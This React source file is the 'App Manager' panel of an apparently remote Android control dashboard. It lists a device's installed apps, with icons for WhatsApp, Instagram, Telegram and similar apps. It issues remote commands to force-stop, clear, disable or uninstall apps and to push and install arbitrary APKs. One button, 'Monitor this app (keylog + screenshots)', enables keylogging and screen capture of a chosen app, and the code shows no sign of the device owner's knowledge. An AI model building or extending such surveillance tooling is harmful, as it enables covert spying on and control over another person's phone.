import React, { useState, useEffect, useRef } from 'react';

const SYSTEM_ICONS = {
  'com.whatsapp': '💬',
  'com.instagram.android': '📸',
  'com.facebook.katana': '👤',
  'org.telegram.messenger': '✈️',
  'com.snapchat.android': '👻',
  'com.zhiliaoapp.musically': '🎵',
  'com.twitter.android': '🐦',
  'com.google.android.gm': '📧',
  'com.google.android.chrome': '🌐',
  'com.google.android.youtube': '▶️',
};

function getAppIcon(pkg) {
  return SYSTEM_ICONS[pkg] || '📦';
}

function getResponsePayload(result) {
  if (!result) return null;
  if (typeof result.response === 'string') {
    try { return JSON.parse(result.response); } catch (_) { return null; }
  }
  return result.response && typeof result.response === 'object' ? result.response : null;
}

function getCommandFailure(result, fallback) {
  const payload = getResponsePayload(result);
  if (result?.success === false || payload?.success === false) {
    const message = payload?.error || result?.error || fallback;
    if (/file:\/\/.*exposed beyond app through Intent\.getData\(\)/i.test(message)) {
      return 'This device is running an older controller app. Install an updated controller APK with the FileProvider fix, then retry.';
    }
    return message;
  }
  return null;
}

export default function AppManager({ device, sendCommand, results = [] }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [apps, setApps]         = useState([]);
  const [loading, setLoading]   = useState(false);
  const [search, setSearch]     = useState('');
  const [showSystem, setShowSystem] = useState(false);
  const [sortBy, setSortBy]     = useState('name');
  const [confirmAction, setConfirmAction] = useState(null);
  const [uninstallPending, setUninstallPending] = useState(null); // { pkg, countdown }
  const [installFlow, setInstallFlow] = useState(null);
  const uninstallTimerRef = useRef(null);
  const installReaderRef = useRef(null);
  const commandResultWaitersRef = useRef(new Map());
  const resultsRef = useRef(results);
  const mountedRef = useRef(false);
  const seenIds = useRef(new Set());
  resultsRef.current = results;

  const installBusy = installFlow && !['done', 'error'].includes(installFlow.phase);
  const updateInstallFlow = (flow, updates) => {
    Object.assign(flow, updates);
    if (mountedRef.current) setInstallFlow({ ...flow });
  };

  const waitForCommandResult = (commandId, timeoutMs = 90000) => {
    const id = String(commandId);
    const existing = resultsRef.current.find(result => String(result.id) === id);
    if (existing) return Promise.resolve(existing);

    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        commandResultWaitersRef.current.delete(id);
        reject(new Error('Timed out waiting for the device to confirm the command.'));
      }, timeoutMs);
      commandResultWaitersRef.current.set(id, {
        timer,
        resolve: result => {
          clearTimeout(timer);
          commandResultWaitersRef.current.delete(id);
          resolve(result);
        },
        reject: error => {
          clearTimeout(timer);
          commandResultWaitersRef.current.delete(id);
          reject(error);
        },
      });
    });
  };

  const fetchApps = () => {
    setLoading(true);
    sendCommand(deviceId, 'get_installed_apps', {});
  };

  // Apps are loaded manually via the Load button

  // Parse results
  useEffect(() => {
    results.forEach(r => {
      if (r.command !== 'get_installed_apps' || seenIds.current.has(r.id)) return;

      const data = typeof r.response === 'string'
        ? (() => { try { return JSON.parse(r.response); } catch (_) { return null; } })()
        : r.response;

      // Chunked commands first return a transport acknowledgement.  It is not
      // the app list and must not consume the result ID before the final chunk
      // aggregate arrives.
      if (r.success && data?.streaming && !data.apps && !data.installedApps) return;

      seenIds.current.add(r.id);
      setLoading(false);
      if (r.success && data) {
        const list = data.apps || data.installedApps || [];
        setApps(Array.isArray(list) ? list : []);
      }
    });
  }, [results]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      if (installReaderRef.current?.readyState === FileReader.LOADING) {
        installReaderRef.current.abort();
      }
      for (const waiter of commandResultWaitersRef.current.values()) {
        waiter.reject(new Error('App Manager closed before the device responded.'));
      }
      commandResultWaitersRef.current.clear();
    };
  }, []);

  useEffect(() => {
    results.forEach(result => {
      const waiter = commandResultWaitersRef.current.get(String(result.id));
      if (waiter) waiter.resolve(result);
    });
  }, [results]);

  const startApkInstall = (file) => {
    const safeName = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
    const filePath = `/sdcard/Download/${Date.now()}_${safeName}`;
    const flow = {
      id: `${Date.now()}-${file.size}`,
      deviceId,
      filePath,
      fileName: file.name,
      phase: 'reading',
      progress: 0,
      message: 'Preparing the selected APK…',
    };
    setInstallFlow({ ...flow });

    const reader = new FileReader();
    installReaderRef.current = reader;
    reader.onprogress = event => {
      if (!event.lengthComputable) return;
      updateInstallFlow(flow, {
        phase: 'reading',
        progress: Math.round((event.loaded / event.total) * 100),
        message: `Preparing APK (${Math.round((event.loaded / event.total) * 100)}%)…`,
      });
    };
    reader.onerror = () => {
      updateInstallFlow(flow, {
        phase: 'error',
        message: reader.error?.message || 'Could not read the selected APK.',
      });
    };
    reader.onabort = () => {
      updateInstallFlow(flow, { phase: 'error', message: 'APK preparation was cancelled.' });
    };
    reader.onload = async () => {
      const dataUrl = String(reader.result || '');
      const comma = dataUrl.indexOf(',');
      if (comma < 0) {
        updateInstallFlow(flow, { phase: 'error', message: 'Could not encode the selected APK.' });
        return;
      }

      try {
        updateInstallFlow(flow, {
          phase: 'backend',
          progress: 100,
          message: 'Uploading APK to the backend…',
        });
        const acceptedWrite = await sendCommand(deviceId, 'write_file', {
          filePath,
          content: dataUrl.slice(comma + 1),
          isBase64: true,
        });
        if (!acceptedWrite?.success || !acceptedWrite.commandId) {
          throw new Error(acceptedWrite?.error || 'The backend did not accept the APK upload.');
        }
        if (!mountedRef.current) return;

        updateInstallFlow(flow, {
          phase: 'device',
          message: 'Backend accepted the APK. Sending it to the device…',
        });
        const writeResult = await waitForCommandResult(acceptedWrite.commandId);
        const writeError = getCommandFailure(writeResult, 'The device could not save the APK.');
        if (writeError) throw new Error(writeError);
        if (!mountedRef.current) return;

        updateInstallFlow(flow, {
          phase: 'installer',
          message: 'APK received by the device. Opening Android’s installer…',
        });
        const acceptedInstall = await sendCommand(deviceId, 'install_app', { filePath });
        if (!acceptedInstall?.success || !acceptedInstall.commandId) {
          throw new Error(acceptedInstall?.error || 'The backend did not send the install request.');
        }
        const installResult = await waitForCommandResult(acceptedInstall.commandId);
        const installError = getCommandFailure(installResult, 'The device could not open the installer.');
        if (installError) throw new Error(installError);

        updateInstallFlow(flow, {
          phase: 'done',
          progress: 100,
          message: 'Installer opened. Confirm the installation on the device.',
        });
      } catch (error) {
        updateInstallFlow(flow, { phase: 'error', message: error?.message || 'APK installation failed.' });
      }
    };
    reader.readAsDataURL(file);
  };

  const performAction = (action, pkg) => {
    if (['uninstall_app', 'clear_app_data', 'disable_app'].includes(action)) {
      setConfirmAction({ action, pkg });
    } else {
      sendCommand(deviceId, action, { packageName: pkg });
    }
  };

  const confirmAndExecute = () => {
    if (!confirmAction) return;
    const { action, pkg } = confirmAction;
    sendCommand(deviceId, action, { packageName: pkg });
    setConfirmAction(null);

    if (action === 'uninstall_app') {
      let secs = 5;
      setUninstallPending({ pkg, countdown: secs });
      uninstallTimerRef.current = setInterval(() => {
        secs -= 1;
        if (secs <= 0) {
          clearInterval(uninstallTimerRef.current);
          uninstallTimerRef.current = null;
          setUninstallPending(null);
          setApps(prev => prev.filter(a => a.packageName !== pkg));
        } else {
          setUninstallPending({ pkg, countdown: secs });
        }
      }, 1000);
    }
  };

  useEffect(() => {
    return () => { if (uninstallTimerRef.current) clearInterval(uninstallTimerRef.current); };
  }, []);

  const actionLabel = (action) => {
    switch (action) {
      case 'uninstall_app': return 'Uninstall';
      case 'clear_app_data': return 'Clear Data';
      case 'disable_app': return 'Disable';
      default: return action;
    }
  };

  let displayed = apps
    .filter(a => showSystem || !(a.isSystemApp || a.isSystem))
    .filter(a => {
      if (!search) return true;
      const q = search.toLowerCase();
      return (a.appName || a.name || '').toLowerCase().includes(q) || (a.packageName || '').toLowerCase().includes(q);
    });

  if (sortBy === 'name') {
    displayed = [...displayed].sort((a, b) => (a.appName || a.name || '').localeCompare(b.appName || b.name || ''));
  } else if (sortBy === 'package') {
    displayed = [...displayed].sort((a, b) => (a.packageName || '').localeCompare(b.packageName || ''));
  }

  return (
    <div className="app-manager">
      <div className="am-toolbar">
        <input
          className="am-search"
          placeholder="🔍 Search apps…"
          value={search}
          onChange={e => setSearch(e.target.value)}
        />
        <select className="am-sort" value={sortBy} onChange={e => setSortBy(e.target.value)}>
          <option value="name">Sort: Name</option>
          <option value="package">Sort: Package</option>
        </select>
        <label className="am-system-toggle">
          <input type="checkbox" checked={showSystem} onChange={e => setShowSystem(e.target.checked)} />
          Show System
        </label>
        <button className="am-refresh-btn" onClick={fetchApps} disabled={!isOnline || loading}>
          {loading ? '…' : '↻ Refresh'}
        </button>
        <label
          className={`am-refresh-btn${installBusy ? ' am-install-trigger-busy' : ''}`}
          style={{ cursor: isOnline && !installBusy ? 'pointer' : 'not-allowed', opacity: isOnline && !installBusy ? 1 : 0.5 }}
        >
          <input
            type="file"
            accept=".apk,application/vnd.android.package-archive"
            style={{ display: 'none' }}
            disabled={!isOnline || installBusy}
            onChange={(e) => {
              const file = e.target.files && e.target.files[0];
              if (!file) return;
              if (!file.name.toLowerCase().endsWith('.apk')) {
                setInstallFlow({
                  phase: 'error',
                  fileName: file.name,
                  message: 'Choose an .apk file to install.',
                });
                e.target.value = '';
                return;
              }
              startApkInstall(file);
              e.target.value = '';
            }}
          />
          {installBusy ? 'Sending APK…' : '📦 Install App'}
        </label>
      </div>

      {installFlow && (
        <div
          className={`am-install-status am-install-${installFlow.phase}`}
          role="status"
          aria-live="polite"
        >
          <div className="am-install-status-heading">
            <span className="am-install-status-icon" aria-hidden="true">
              {installFlow.phase === 'done' ? '✓' : installFlow.phase === 'error' ? '!' : '⬆'}
            </span>
            <div className="am-install-status-copy">
              <strong>
                {installFlow.phase === 'reading' && 'Preparing APK'}
                {installFlow.phase === 'backend' && 'Uploading to backend'}
                {installFlow.phase === 'device' && 'Sending to device'}
                {installFlow.phase === 'installer' && 'Opening installer'}
                {installFlow.phase === 'done' && 'APK ready to install'}
                {installFlow.phase === 'error' && 'APK install failed'}
              </strong>
              <span>{installFlow.fileName}</span>
            </div>
            {installFlow.phase === 'reading' && <span className="am-install-percent">{installFlow.progress}%</span>}
          </div>
          <div
            className="am-install-progress"
            role="progressbar"
            aria-label="APK transfer progress"
            aria-valuemin="0"
            aria-valuemax="100"
            aria-valuenow={installFlow.phase === 'reading' || installFlow.phase === 'done' ? installFlow.progress : undefined}
          >
            <span
              className={['backend', 'device', 'installer'].includes(installFlow.phase) ? 'am-progress-indeterminate' : ''}
              style={{
                width: installFlow.phase === 'reading' || installFlow.phase === 'done'
                  ? `${installFlow.progress}%`
                  : undefined,
              }}
            />
          </div>
          <p className="am-install-message">{installFlow.message}</p>
        </div>
      )}

      {uninstallPending && (
        <div style={{
          background: 'rgba(239,68,68,0.12)', border: '1px solid rgba(239,68,68,0.35)',
          borderRadius: 8, padding: '10px 14px', display: 'flex', alignItems: 'center', gap: 10,
          marginBottom: 8,
        }}>
          <span style={{ fontSize: 16 }}>🗑</span>
          <span style={{ color: '#fca5a5', fontSize: 13 }}>
            Uninstalling <strong>{uninstallPending.pkg}</strong>…
          </span>
          <span style={{ marginLeft: 'auto', color: '#ef4444', fontWeight: 700, fontSize: 13 }}>
            {uninstallPending.countdown}s
          </span>
        </div>
      )}

      <div className="am-stats">
        {displayed.length} apps shown {apps.length > 0 && `of ${apps.length} total`}
        {loading && <span style={{ color: '#f59e0b', marginLeft: 8 }}>Loading…</span>}
      </div>

      <div className="am-grid">
        {displayed.length === 0 && !loading && (
          <div className="am-empty">
            <div style={{ fontSize: 40 }}>📦</div>
            <div>{isOnline ? 'Click Refresh to load apps' : 'Device is offline'}</div>
          </div>
        )}
        {displayed.map(app => (
          <div key={app.packageName} className="am-app-card">
            <div className="am-app-header">
              <span className="am-app-icon">{getAppIcon(app.packageName)}</span>
              <div className="am-app-info">
                <div className="am-app-name">{app.name || app.appName || '—'}</div>
                <div className="am-app-pkg" title={app.packageName}>{app.packageName}</div>
                {app.versionName && <div className="am-app-ver">v{app.versionName}</div>}
              </div>
              {(app.isSystemApp || app.isSystem) && <span className="am-system-badge">SYS</span>}
            </div>
            <div className="am-app-actions">
              <button
                className="am-action-btn am-open"
                onClick={() => performAction('open_app', app.packageName)}
                disabled={!isOnline}
                title="Open App"
              >
                ▶ Open
              </button>
              <button
                className="am-action-btn am-stop"
                onClick={() => performAction('force_stop_app', app.packageName)}
                disabled={!isOnline}
                title="Force Stop"
              >
                ⏹ Stop
              </button>
              <button
                className="am-action-btn am-clear"
                onClick={() => performAction('clear_app_data', app.packageName)}
                disabled={!isOnline}
                title="Clear Data"
              >
                🧹 Clear
              </button>
              <button
                className="am-action-btn am-disable"
                onClick={() => performAction('disable_app', app.packageName)}
                disabled={!isOnline}
                title="Disable App"
              >
                🚫 Disable
              </button>
              <button
                className="am-action-btn am-monitor"
                onClick={() => sendCommand(deviceId, 'add_monitored_app', { packageName: app.packageName })}
                disabled={!isOnline}
                title="Monitor this app (keylog + screenshots)"
              >
                📡 Monitor
              </button>
              <button
                className="am-action-btn am-uninstall"
                onClick={() => performAction('uninstall_app', app.packageName)}
                disabled={!isOnline}
                title="Uninstall"
              >
                🗑 Uninstall
              </button>
            </div>
          </div>
        ))}
      </div>

      {confirmAction && (
        <div className="modal-overlay" onClick={() => setConfirmAction(null)}>
          <div className="modal-box" onClick={e => e.stopPropagation()}>
            <div className="modal-title">⚠️ Confirm {actionLabel(confirmAction.action)}</div>
            <div style={{ margin: '12px 0', color: '#94a3b8', fontSize: 14 }}>
              Are you sure you want to <strong style={{ color: '#ef4444' }}>{actionLabel(confirmAction.action).toLowerCase()}</strong> this app?
            </div>
            <div style={{ background: '#0f0f1a', borderRadius: 8, padding: '8px 12px', marginBottom: 16, fontFamily: 'monospace', fontSize: 13 }}>
              {confirmAction.pkg}
            </div>
            <div className="modal-actions">
              <button className="btn-secondary" onClick={() => setConfirmAction(null)}>Cancel</button>
              <button
                style={{ background: '#ef4444', color: 'white', border: 'none', padding: '8px 16px', borderRadius: 8, cursor: 'pointer' }}
                onClick={confirmAndExecute}
              >
                {actionLabel(confirmAction.action)}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
